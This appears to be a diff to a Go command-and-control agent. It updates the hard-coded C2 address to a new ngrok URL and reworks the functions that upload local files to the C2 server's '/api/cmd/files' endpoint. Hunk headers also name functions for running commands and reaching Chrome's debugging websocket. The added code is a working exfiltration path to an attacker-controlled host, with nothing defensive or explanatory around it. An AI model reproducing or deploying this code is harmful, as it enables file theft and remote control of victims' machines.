@@ -66,7 +66,7 @@ type Cmd struct {
 }
 
 var timeoutSetting = 1
-var c2 = "https://e49a4a48f45d.ngrok.io"
+var c2 = "https://14e88891e726.ngrok.io"
 
 func main() {
 	uuid := shortuuid.New()
@@ -211,28 +211,27 @@ func runCommand(commandStr string, cmdid string) error {
 }
 
 func uploadFile(path string, c2 string) string {
-	extraParams := map[string]string{
-		"operator": "none",
-	}
-	request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
-	if err != nil {
-		log.Fatal(err)
-	}
-	client := &http.Client{}
-	resp, err := client.Do(request)
-	if err != nil {
-		log.Fatal(err)
-	} else {
-		body := &bytes.Buffer{}
-		_, err := body.ReadFrom(resp.Body)
-		if err != nil {
-			log.Fatal(err)
+	if _, err := os.Stat(path); err == nil {
+		extraParams := map[string]string{
+			"operator": "none",
 		}
-		resp.Body.Close()
-		//fmt.Println(resp.StatusCode)
-		//fmt.Println(resp.Header)
-		fmt.Println(body.String())
-		return body.String()
+		request, err := newfileUploadRequest(c2+"/api/cmd/files", extraParams, "myFile", path)
+		if err != nil {
+			fmt.Println(err)
+		}
+		client := &http.Client{}
+		resp, err := client.Do(request)
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			body := &bytes.Buffer{}
+			_, err := body.ReadFrom(resp.Body)
+			if err != nil {
+				fmt.Println(err)
+			}
+			resp.Body.Close()
+			return body.String()
+		}
 	}
 	return ""
 }
@@ -494,29 +493,32 @@ func getChromeWSS(url string) {
 
 // Creates a new file upload http request with optional extra params
 func newfileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
-	file, err := os.Open(path)
-	if err != nil {
-		return nil, err
-	}
-	defer file.Close()
+	if _, err := os.Stat(path); err == nil {
+		file, err := os.Open(path)
+		if err != nil {
+			return nil, err
+		}
+		defer file.Close()
 
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
-	if err != nil {
-		return nil, err
-	}
-	_, err = io.Copy(part, file)
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		part, err := writer.CreateFormFile(paramName, filepath.Base(path))
+		if err != nil {
+			return nil, err
+		}
+		_, err = io.Copy(part, file)
 
-	for key, val := range params {
-		_ = writer.WriteField(key, val)
-	}
-	err = writer.Close()
-	if err != nil {
-		return nil, err
-	}
+		for key, val := range params {
+			_ = writer.WriteField(key, val)
+		}
+		err = writer.Close()
+		if err != nil {
+			return nil, err
+		}
 
-	req, err := http.NewRequest("POST", uri, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-	return req, err
+		req, err := http.NewRequest("POST", uri, body)
+		req.Header.Set("Content-Type", writer.FormDataContentType())
+		return req, err
+	}
+	return nil, nil
 }
